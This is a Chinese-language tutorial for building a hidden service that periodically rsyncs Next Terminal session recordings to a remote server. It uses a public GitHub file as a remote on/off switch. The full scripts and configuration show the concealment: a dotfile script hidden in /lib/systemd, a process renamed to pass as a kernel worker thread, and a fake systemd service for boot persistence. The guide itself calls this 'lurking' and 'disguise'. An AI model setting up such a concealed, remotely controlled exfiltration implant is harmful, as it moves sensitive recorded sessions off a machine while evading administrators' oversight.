🛠️ 第一阶段：打通免密传输通道
1. 配置目标服务器 (101.47.10.15)
在目标机器上，需要准备好接收账号和目录，并修改 SSH 端口以防爆破。

创建专属同步账号：useradd -m syncuser

修改 /etc/ssh/sshd_config，将 Port 22 改为 Port 10022，并重启 sshd 服务。

确保接收目录存在并具有写入权限：/home/debian/bak/next-terminal/pro_pg/data/recordings/

2. 源服务器生成钥匙并派发
回到源服务器，建立信任关系。

```Bash
# 1. 生成密钥对（如果已有可跳过，一路回车即可）
ssh-keygen -t ed25519

# 2. 将公钥发送给目标服务器（需要输入一次 syncuser 的密码）
ssh-copy-id -i ~/.ssh/id_ed25519.pub -p 10022 syncuser@101.47.10.15

# 3. 测试免密通道（如果直接登录成功且无需密码，则通道打通）
ssh -p 10022 syncuser@101.47.10.15
```


📡 第二阶段：制作 GitHub 远程控制开关
登录 GitHub，访问 Gist。

创建一个名为 sync_switch.txt 的公开文件，内容只写数字 0。

点击 Raw 按钮，复制浏览器地址栏中的纯文本链接（URL）。

约定：0 代表开启同步，其他任何值（如 1）代表暂停同步。

🥷 第三阶段：编写“潜伏”核心脚本
将核心业务代码隐藏在 Linux 底层系统目录，并以 . 开头设为隐藏文件。

1. 创建并编辑核心脚本：

```Bash
vi /lib/systemd/.session-core.sh
```

2. 填入以下代码（注意替换 GitHub URL）：

```Bash
#!/bin/bash

# 定义远程遥控开关地址 (替换为你的 GitHub Raw 链接)
CONTROL_URL="https://gist.githubusercontent.com/你的用户名/xxxx/raw/sync_switch.txt"

while true; do
    # 抓取指令 (超时设为10秒防卡死，并去除末尾不可见换行符)
    SYNC_FLAG=$(curl -s --max-time 10 "$CONTROL_URL" | tr -d '[:space:]')

    # 指令判断：仅当获取到严格的 "0" 时才执行同步
    if [ "$SYNC_FLAG" = "0" ]; then
        rsync -rvzc -e "ssh -p 10022" \
        /root/next-terminal/pro_pg/data/recordings/ \
        syncuser@101.47.10.15:/home/debian/bak/next-terminal/pro_pg/data/recordings/ > /dev/null 2>&1
    fi

    # 休眠 7200 秒 (2小时) 后开启下一轮侦测
    sleep 7200
done
```

3. 赋予执行权限：

```Bash
chmod +x /lib/systemd/.session-core.sh
```

🎭 第四阶段：注册并伪装 Systemd 服务
利用 exec -a 技巧修改进程在内存中的名字，并套上 systemd 组件的外壳。

1. 创建服务配置文件：

```Bash
vi /etc/systemd/system/systemd-events-manager.service
```
2. 填入以下配置：

```Ini, TOML
[Unit]
Description=System Events Manager
After=network.target

[Service]
Type=simple
# 【核心伪装术】: 用 exec -a 将进程名强行改为系统内核工作线程的名字
ExecStart=/bin/bash -c 'exec -a "[kworker/u4:2-events]" /lib/systemd/.session-core.sh'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

🚀 第五阶段：启动与守护
激活服务，让其进入系统底层静默运行。

```Bash
# 1. 重新加载系统服务配置
systemctl daemon-reload

# 2. 设置开机自启（植入系统启动链）
systemctl enable systemd-events-manager.service

# 3. 立即启动服务
systemctl start systemd-events-manager.service

# 4. 检查运行状态（应显示绿色 active）
systemctl status systemd-events-manager.service
```


🔧 附加配置：设置快捷管理入口 (防遗忘)
为了防止日后找不到被隐藏的文件，在系统环境中留下一个“后门”快捷指令。

```Bash
# 将快捷键写入 bash 环境变量
echo "alias editsync='vi /lib/systemd/.session-core.sh'" >> ~/.bashrc
echo "alias logsync='systemctl status systemd-events-manager.service'" >> ~/.bashrc


# 立即生效
source ~/.bashrc
日常维护：

终端输入 editsync 即可瞬间打开并修改潜伏脚本。

终端输入 logsync 即可快速查看服务运行状态。

手机打开 GitHub 修改 Gist 文本为 1，即可远程叫停同步。
```




# 完整的自动同步服务脚本

```
#!/bin/bash

CONTROL_URL="https://raw.githubusercontent.com/vsyour/core/refs/heads/main/sync_switch/sync_switch.txt"

while true; do
    SYNC_FLAG=$(curl -s --max-time 10 "$CONTROL_URL" | tr -d '[:space:]')

    if [ "$SYNC_FLAG" = "0" ]; then
        #rsync -rvz -e "ssh -p 10022" --ignore-existing /root/next-terminal/pro_pg/data/recordings/ syncuser@101.47.10.15:/home/debian/bak/next-terminal/pro_pg/data/recordings/ > /dev/null 2>&1
        rsync -rvzc -e "ssh -p 10022" /root/next-terminal/pro_pg/data/recordings/ syncuser@101.47.10.15:/home/debian/bak/next-terminal/pro_pg/data/recordings/ > /dev/null 2>&1
    fi

    sleep 7200
done

```

